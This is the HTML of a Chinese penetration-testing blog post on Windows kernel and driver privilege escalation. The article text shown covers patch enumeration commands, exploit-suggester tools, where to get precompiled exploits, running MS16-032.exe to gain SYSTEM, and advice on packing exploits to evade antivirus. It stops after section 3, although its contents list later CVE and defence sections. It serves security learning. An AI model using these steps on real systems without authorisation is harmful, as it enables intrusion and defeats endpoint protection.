@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="前言Windows内核提权是渗透测试与红队行动中的关键环节。从获得一个低权限Shell到拿下SYSTEM，中间的桥梁往往是内核或驱动层面的漏洞。本文将系统性地梳理Windows内核提权的实战方法，涵盖信息收集、补丁对比、预编译Exploit使用、驱动签名强制（DSE）绕过，以及三个影响深远的CVE案例分析。  一、权限基础：Windows安全模型速览Windows的访问控制基于以下几个核心概念：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows提权：内核与驱动漏洞">
+<meta property="og:url" content="https://congliang.github.io/Windows-privesc-kernel-driver/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="前言Windows内核提权是渗透测试与红队行动中的关键环节。从获得一个低权限Shell到拿下SYSTEM，中间的桥梁往往是内核或驱动层面的漏洞。本文将系统性地梳理Windows内核提权的实战方法，涵盖信息收集、补丁对比、预编译Exploit使用、驱动签名强制（DSE）绕过，以及三个影响深远的CVE案例分析。  一、权限基础：Windows安全模型速览Windows的访问控制基于以下几个核心概念：">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-02-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:46.007Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="权限提升">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Windows-privesc-kernel-driver/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Windows-privesc-kernel-driver/","path":"Windows-privesc-kernel-driver/","title":"Windows提权：内核与驱动漏洞"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Windows提权：内核与驱动漏洞 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E6%9D%83%E9%99%90%E5%9F%BA%E7%A1%80%EF%BC%9AWindows%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%E9%80%9F%E8%A7%88"><span class="nav-number">2.</span> <span class="nav-text">一、权限基础：Windows安全模型速览</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%9Asysteminfo%E4%B8%8E%E8%A1%A5%E4%B8%81%E5%AF%B9%E6%AF%94"><span class="nav-number">3.</span> <span class="nav-text">二、信息收集：systeminfo与补丁对比</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF"><span class="nav-number">3.1.</span> <span class="nav-text">2.1 获取系统基础信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E5%88%A9%E7%94%A8PowerShell%E8%BF%9B%E8%A1%8C%E8%A1%A5%E4%B8%81%E6%9E%9A%E4%B8%BE"><span class="nav-number">3.2.</span> <span class="nav-text">2.2 利用PowerShell进行补丁枚举</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-%E7%BC%BA%E5%A4%B1%E8%A1%A5%E4%B8%81%E4%B8%8E%E6%BC%8F%E6%B4%9E%E6%9E%9A%E4%B8%BE%E5%B7%A5%E5%85%B7"><span class="nav-number">3.3.</span> <span class="nav-text">2.3 缺失补丁与漏洞枚举工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-%E6%89%8B%E5%8A%A8%E5%AF%B9%E6%AF%94%E6%8A%80%E5%B7%A7"><span class="nav-number">3.4.</span> <span class="nav-text">2.4 手动对比技巧</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E9%A2%84%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8Exploit%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">三、预编译内核Exploit的使用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-Exploit-%E8%8E%B7%E5%8F%96%E6%B8%A0%E9%81%93"><span class="nav-number">4.1.</span> <span class="nav-text">3.1 Exploit 获取渠道</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-%E4%BD%BF%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="nav-number">4.2.</span> <span class="nav-text">3.2 使用流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-%E7%BC%96%E8%AF%91%E8%87%AA%E5%B7%B1%E7%9A%84Exploit"><span class="nav-number">4.3.</span> <span class="nav-text">3.3 编译自己的Exploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E9%A9%B1%E5%8A%A8%E7%AD%BE%E5%90%8D%E5%BC%BA%E5%88%B6%EF%BC%88DSE%EF%BC%89%E7%BB%95%E8%BF%87"><span class="nav-number">5.</span> <span class="nav-text">四、驱动签名强制（DSE）绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-DSE-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="nav-number">5.1.</span> <span class="nav-text">4.1 DSE 工作原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number">5.2.</span> <span class="nav-text">4.2 绕过方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81CVE-2021-1732%EF%BC%9Awin32k-%E7%AA%97%E5%8F%A3%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="nav-number">6.</span> <span class="nav-text">五、CVE-2021-1732：win32k 窗口内核提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="nav-number">6.1.</span> <span class="nav-text">5.1 漏洞概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-%E6%BC%8F%E6%B4%9E%E6%A0%B9%E5%9B%A0"><span class="nav-number">6.2.</span> <span class="nav-text">5.2 漏洞根因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-number">6.3.</span> <span class="nav-text">5.3 利用过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-4-%E9%98%B2%E5%BE%A1"><span class="nav-number">6.4.</span> <span class="nav-text">5.4 防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81CVE-2022-21882%EF%BC%9AWin32k-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="nav-number">7.</span> <span class="nav-text">六、CVE-2022-21882：Win32k 本地提权漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-1-%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="nav-number">7.1.</span> <span class="nav-text">6.1 漏洞概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-2-%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90"><span class="nav-number">7.2.</span> <span class="nav-text">6.2 技术分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-3-%E5%88%A9%E7%94%A8%E8%A6%81%E7%82%B9"><span class="nav-number">7.3.</span> <span class="nav-text">6.3 利用要点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81PrintNightmare%EF%BC%9ACVE-2021-34527-Print-Spooler"><span class="nav-number">8.</span> <span class="nav-text">七、PrintNightmare：CVE-2021-34527 (Print Spooler)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#7-1-%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="nav-number">8.1.</span> <span class="nav-text">7.1 漏洞概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-2-%E6%BC%8F%E6%B4%9E%E6%A0%B9%E5%9B%A0"><span class="nav-number">8.2.</span> <span class="nav-text">7.2 漏洞根因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-3-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%A9%E7%94%A8"><span class="nav-number">8.3.</span> <span class="nav-text">7.3 本地提权利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-4-%E5%AE%9E%E9%99%85%E7%9A%84%E5%9D%91%EF%BC%88Field-Notes%EF%BC%89"><span class="nav-number">8.4.</span> <span class="nav-text">7.4 实际的坑（Field Notes）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-5-%E4%BF%AE%E5%A4%8D%E4%B8%8E%E7%BC%93%E8%A7%A3"><span class="nav-number">8.5.</span> <span class="nav-text">7.5 修复与缓解</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E9%80%9A%E7%94%A8%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E8%AE%BA%E6%80%BB%E7%BB%93"><span class="nav-number">9.</span> <span class="nav-text">八、通用内核提权方法论总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#8-1-%E6%B5%81%E7%A8%8B%E6%80%BB%E8%A7%88"><span class="nav-number">9.1.</span> <span class="nav-text">8.1 流程总览</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-2-Exploit-%E9%80%89%E6%8B%A9%E5%86%B3%E7%AD%96%E6%A0%91"><span class="nav-number">9.2.</span> <span class="nav-text">8.2 Exploit 选择决策树</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-3-%E5%85%8D%E6%9D%80%E6%9C%80%E4%BD%8E%E8%A6%81%E6%B1%82"><span class="nav-number">9.3.</span> <span class="nav-text">8.3 免杀最低要求</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%E3%80%81%E9%98%B2%E5%BE%A1%E8%A7%86%E8%A7%92%EF%BC%9A%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%8A%A0%E5%9B%BA"><span class="nav-number">10.</span> <span class="nav-text">九、防御视角：检测与加固</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#9-1-%E6%A3%80%E6%B5%8B%E6%8C%87%E6%A0%87"><span class="nav-number">10.1.</span> <span class="nav-text">9.1 检测指标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-2-Sysmon-%E6%A3%80%E6%B5%8B%E8%A7%84%E5%88%99"><span class="nav-number">10.2.</span> <span class="nav-text">9.2 Sysmon 检测规则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-3-%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA%E5%BB%BA%E8%AE%AE"><span class="nav-number">10.3.</span> <span class="nav-text">9.3 系统加固建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E3%80%81%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">11.</span> <span class="nav-text">十、免责声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-number">12.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Windows-privesc-kernel-driver/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Windows提权：内核与驱动漏洞 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Windows提权：内核与驱动漏洞
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-02-01 08:00:00" itemprop="dateCreated datePublished" datetime="2025-02-01T08:00:00+08:00">2025-02-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:46" itemprop="dateModified" datetime="2026-06-04T23:34:46+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Windows内核提权是渗透测试与红队行动中的关键环节。从获得一个低权限Shell到拿下SYSTEM，中间的桥梁往往是内核或驱动层面的漏洞。本文将系统性地梳理Windows内核提权的实战方法，涵盖信息收集、补丁对比、预编译Exploit使用、驱动签名强制（DSE）绕过，以及三个影响深远的CVE案例分析。</p>
+<hr>
+<h2 id="一、权限基础：Windows安全模型速览"><a href="#一、权限基础：Windows安全模型速览" class="headerlink" title="一、权限基础：Windows安全模型速览"></a>一、权限基础：Windows安全模型速览</h2><p>Windows的访问控制基于以下几个核心概念：</p>
+<table>
+<thead>
+<tr>
+<th>概念</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Access Token</strong></td>
+<td>每个进程拥有一个访问令牌，记录其所属用户、组、特权列表</td>
+</tr>
+<tr>
+<td><strong>Integrity Level</strong></td>
+<td>从Untrusted到System共6个级别，限制跨级别交互</td>
+</tr>
+<tr>
+<td><strong>UAC</strong></td>
+<td>用户账户控制，管理员默认以<code>Medium IL</code>运行，提权需提升至<code>High IL</code></td>
+</tr>
+<tr>
+<td><strong>Session 0 Isolation</strong></td>
+<td>服务运行在Session 0，用户登录在Session 1+，隔离机制防止Shatter攻击</td>
+</tr>
+<tr>
+<td><strong>SYSTEM (NT AUTHORITY\SYSTEM)</strong></td>
+<td>最高权限账户，比Administrator拥有更多特权</td>
+</tr>
+</tbody></table>
+<p>渗透攻击的核心目标通常是从<code>Medium IL</code>提升至<code>High IL</code>（管理员）或直接获取<code>NT AUTHORITY\SYSTEM</code>权限。</p>
+<hr>
+<h2 id="二、信息收集：systeminfo与补丁对比"><a href="#二、信息收集：systeminfo与补丁对比" class="headerlink" title="二、信息收集：systeminfo与补丁对比"></a>二、信息收集：systeminfo与补丁对比</h2><h3 id="2-1-获取系统基础信息"><a href="#2-1-获取系统基础信息" class="headerlink" title="2.1 获取系统基础信息"></a>2.1 获取系统基础信息</h3><p>拿到低权限Shell后，首先收集系统版本与补丁情况：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">systeminfo | findstr /B /C:<span class="string">&quot;OS Name&quot;</span> /C:<span class="string">&quot;OS Version&quot;</span> /C:<span class="string">&quot;System Type&quot;</span> /C:<span class="string">&quot;Hotfix&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Hotfix(s):                 7 Hotfix(s) Installed.</span><br><span class="line">[01]: KB5012170</span><br><span class="line">[02]: KB5014032</span><br><span class="line">[03]: KB5014671</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-利用PowerShell进行补丁枚举"><a href="#2-2-利用PowerShell进行补丁枚举" class="headerlink" title="2.2 利用PowerShell进行补丁枚举"></a>2.2 利用PowerShell进行补丁枚举</h3><p><code>Get-Hotfix</code> 获取已安装补丁列表，可配合已知漏洞进行比对：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-HotFix</span> | <span class="built_in">Format-Table</span> <span class="literal">-AutoSize</span></span><br><span class="line"><span class="comment"># 只显示安全更新类别的补丁 ID</span></span><br><span class="line"><span class="built_in">Get-HotFix</span> | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.HotFixID <span class="operator">-match</span> <span class="string">&quot;^KB&quot;</span> &#125; | <span class="built_in">Select-Object</span> HotFixID, InstalledOn</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-缺失补丁与漏洞枚举工具"><a href="#2-3-缺失补丁与漏洞枚举工具" class="headerlink" title="2.3 缺失补丁与漏洞枚举工具"></a>2.3 缺失补丁与漏洞枚举工具</h3><p>常用工具包括：</p>
+<ul>
+<li><strong>Watson</strong> (GitHub: rasta-mouse&#x2F;Watson) — 基于C#的缺失补丁枚举，将KB与CVE映射</li>
+<li><strong>Sherlock</strong> (GitHub: rastamouse&#x2F;Sherlock) — PowerShell版漏洞扫描</li>
+<li><strong>WES-NG</strong> (Windows Exploit Suggester - Next Generation) — 将<code>systeminfo</code>输出与漏洞数据库交叉比对</li>
+</ul>
+<p><strong>WES-NG 使用示例：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在靶机上导出 systeminfo</span></span><br><span class="line">systeminfo &gt; C:\temp\sysinfo.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在攻击机上运行（需提前更新数据库）</span></span><br><span class="line">python wes.py sysinfo.txt -i <span class="string">&quot;Elevation of Privilege&quot;</span> --exploits-only</span><br><span class="line"></span><br><span class="line"><span class="comment"># 仅显示有公开Exploit可利用的漏洞</span></span><br><span class="line">python wes.py sysinfo.txt --exploits-only</span><br></pre></td></tr></table></figure>
+
+<p><strong>Watson 使用示例：</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接在目标机器上运行（需 .NET 4.0+）</span></span><br><span class="line">.\Watson.exe</span><br></pre></td></tr></table></figure>
+
+<p>输出会列出可能受影响的CVE编号、对应的KB，以及是否存在公开Exploit。</p>
+<h3 id="2-4-手动对比技巧"><a href="#2-4-手动对比技巧" class="headerlink" title="2.4 手动对比技巧"></a>2.4 手动对比技巧</h3><p>当无法上传工具时，可手动通过KB查询。微软安全更新指南（MSRC）提供CVE与KB的对应关系：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 查询本地已安装的补丁</span><br><span class="line">wmic qfe get HotfixID | findstr KB</span><br><span class="line"></span><br><span class="line"># 结合已知漏洞列表手动排查</span><br><span class="line"># 例：KB5005565 对应 CVE-2021-36934 (HiveNightmare)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="三、预编译内核Exploit的使用"><a href="#三、预编译内核Exploit的使用" class="headerlink" title="三、预编译内核Exploit的使用"></a>三、预编译内核Exploit的使用</h2><h3 id="3-1-Exploit-获取渠道"><a href="#3-1-Exploit-获取渠道" class="headerlink" title="3.1 Exploit 获取渠道"></a>3.1 Exploit 获取渠道</h3><ul>
+<li><strong>GitHub 仓库</strong>：SecWiki&#x2F;windows-kernel-exploits 收集了大量预编译的二进制</li>
+<li><strong>Exploit-DB</strong>：搜索 “Windows local privilege escalation”</li>
+<li><strong>Packet Storm</strong>：搜索目标版本号</li>
+</ul>
+<h3 id="3-2-使用流程"><a href="#3-2-使用流程" class="headerlink" title="3.2 使用流程"></a>3.2 使用流程</h3><p>以经典的MS16-032 (Secondary Logon Handle) 为例：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在64位 Windows 7 / Server 2008 R2 上</span></span><br><span class="line">.\MS16<span class="literal">-032</span>.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># 部分 Exploit 支持指定启动的程序</span></span><br><span class="line">.\MS16<span class="literal">-032</span>.exe cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p><strong>实战注意事项（踩坑清单）：</strong></p>
+<ol>
+<li><strong>架构匹配</strong>：64位系统必须用64位Exploit，32位Exploit在64位系统上操作64位进程会失败</li>
+<li><strong>目标进程选择</strong>：部分Exploit需要指定目标进程PID，如MS16-032需要找到指定条件的进程</li>
+<li><strong>Exploit稳定性</strong>：内核漏洞触发后可能导致蓝屏（BSOD），首次运行应备份当前工作</li>
+<li><strong>杀软对抗</strong>：预编译的公开Exploit几乎必定被杀软标记，需做免杀处理（混淆、加壳、或自行编译修改）</li>
+<li><strong>版本精确性</strong>：即使同为Windows 10，Build号不同（如19041 vs 19044）可能导致Exploit失效</li>
+</ol>
+<h3 id="3-3-编译自己的Exploit"><a href="#3-3-编译自己的Exploit" class="headerlink" title="3.3 编译自己的Exploit"></a>3.3 编译自己的Exploit</h3><p>当需要绕过签名检测或修改Exploit行为时，通常需要自行编译：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 Visual Studio 的 MSBuild</span></span><br><span class="line">MSBuild.exe .\exploit.sln /p:Configuration=Release /p:Platform=x64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或在攻击机上交叉编译后上传</span></span><br></pre></td></tr></table></figure>
+
+<hr>
